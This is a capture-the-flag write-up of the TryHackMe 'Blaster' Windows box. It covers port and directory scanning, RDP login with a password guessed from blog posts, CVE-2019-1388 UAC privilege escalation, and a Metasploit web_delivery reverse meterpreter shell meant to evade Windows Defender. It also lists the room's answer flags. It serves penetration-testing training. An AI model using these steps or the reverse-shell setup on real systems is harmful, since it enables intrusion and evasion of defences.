---
date: 2024-10-08
title: Blaster THM Write-Up
machine_ip: 10.10.244.151
os: Windows
difficulty: Easy
my_rating: 4
tags:
  - Windows
  - PrivEsc
  - CVE-2019-1388
  - nmap
  - gobuster
  - IIS
  - RDP
  - metasploit
  - msfconsole
  - Evasion
references: "[[📚CTF Box Writeups]]"
---
 - [Zero Day Initiative CVE-2019-1388](https://www.youtube.com/watch?v=3BQKpPNlTSo)
 - [Rapid7 CVE-2019-1388](https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388)

This is a THM box/room called [Blaster](https://tryhackme.com/r/room/blaster)

---
# Enumeration

- Nmap
```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -sVC -Pn -p- 10.10.244.151
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 13:54 PDT
Nmap scan report for 10.10.244.151
Host is up (0.17s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-10-08T21:01:37+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2024-10-08T21:01:32+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2024-10-07T20:53:44
|_Not valid after:  2025-04-08T20:53:44
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 411.98 seconds
                                                                
```

- Gobuster
```
┌──(root㉿kali)-[~/Downloads]
└─# gobuster dir -u  http://10.10.244.151 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.151
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/retro                (Status: 301) [Size: 150] [--> http://10.10.244.151/retro/]

```

## Initial Foothold

- At the webpage `http://10.10.244.151/retro` we find posts written by `Wade` (potential username?)
	- On the webpage, we find a Ready Player One post and find a few hints
		- "I keep mistyping the name of his avatar whenever I log in but I think I’ll eventually get it down. Either way, I’m really excited to see this movie! "
		- "Leaving myself a note here just in case I forget how to spell it: parzival"
		- We can infer his login may be `Wade:parzival`

- SUCCESS - we can login as `Wade` with the password `parzival` using RDP

## PrivEsc

- Using CVE-2019-1388, we can elevate privileges using a vulnerability existing in the Windows Certificate Dialog as it does not properly enforce user privileges, aka 'Windows Certificate Dialog Elevation of Privilege Vulnerability'. 
- [Steps](https://github.com/nobodyatall648/CVE-2019-1388):
	1) find a program that can trigger the UAC prompt screen
		1) `hhpud.exe`
	2) select "Show more details"
	3) select "Show information about the publisher's certificate"
	4) click on the "Issued by" URL link it will prompt a browser interface.
	5) wait for the site to be fully loaded & select "save as" to prompt a explorer window for "save as".
	6) on the File Explorer window address path, enter the `cmd.exe` full path:
	`C:\WINDOWS\system32\cmd.exe` then `Enter`
	7) now you'll have an escalated privileges command prompt. 

- User flag - Wade
```
THM{HACK_PLAYER_ONE}
```

- Root flag
```
THM{COIN_OPERATED_EXPLOITATION}
```

## Gain RevShell using Metasploit and bypass AV:

- Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery!
- For this, we'll be using the script web delivery exploit within Metasploit.
	- `use exploit/multi/script/web_delivery`
	- `set target 2`
	- `set lhost tun0`
	- `set lport 443`
	-  `set payload windows/meterpreter/reverse_http`
	- `run -j
- Now, return to the terminal we spawned with our exploit.
	- In this terminal, paste the command output by Metasploit after the job was launched.
	- In this case, I've found it particularly helpful to host a simple python web server (`python3 -m http.server`) and host the command in a text file as copy and paste between the machines won't always work.
	- Once you've run this command, return to our attacker machine and note that our reverse shell has spawned. 
